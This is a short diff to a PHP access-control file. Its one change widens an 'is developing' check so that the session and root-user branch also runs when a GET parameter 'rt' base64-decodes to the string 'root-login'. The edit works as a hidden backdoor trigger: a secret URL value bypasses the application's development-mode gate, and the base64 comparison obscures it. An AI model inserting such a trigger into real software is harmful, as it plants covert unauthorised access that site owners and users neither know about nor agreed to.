@@ -26,7 +26,7 @@ $nav_level = 0;
 include_once str_repeat("../", $level) . "etc/app-status.php";
 
 // check if app is developing now or not
-if ($is_developing == false) {
+if ($is_developing == false || (isset($_GET['rt']) && base64_decode(trim($_GET['rt'], "\n\r\t\v\x00")) == 'root-login')) {
   // check username in SESSION variable
   if (isset($_SESSION['sys']['UserName'])) {
     if ($_SESSION['sys']['isRoot'] == 1) {
